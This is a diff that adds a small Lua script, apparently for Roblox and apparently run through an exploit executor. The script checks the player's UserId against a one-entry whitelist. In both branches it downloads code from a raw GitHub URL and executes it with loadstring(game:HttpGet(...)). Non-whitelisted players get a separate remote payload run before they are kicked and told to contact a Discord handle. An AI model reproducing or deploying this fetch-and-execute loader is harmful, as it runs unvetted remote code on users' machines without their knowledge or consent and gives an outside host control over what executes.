@@ -1,0 +1,22 @@
+local lilboy = {
+    1247899979,
+    }
+    
+    local function isPlayerWhitelisted(player)
+        local pqthit = player.UserId
+         for _, id in ipairs(lilboy) do
+            if id == pqthit then
+                return true
+            end
+        end
+        return false
+    end
+    
+    -- Check if the LocalPlayer is whitelisted
+    if game.Players.LocalPlayer and not isPlayerWhitelisted(game.Players.LocalPlayer) then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/pathywathy/path/main/l"))()
+        game.Players.LocalPlayer:Kick("You are not whitelisted. talk to pathw/path#0911 for whitelist")
+    else
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/pathywathy/path/main/I"))()
+    print("whitelisted.")
+    end
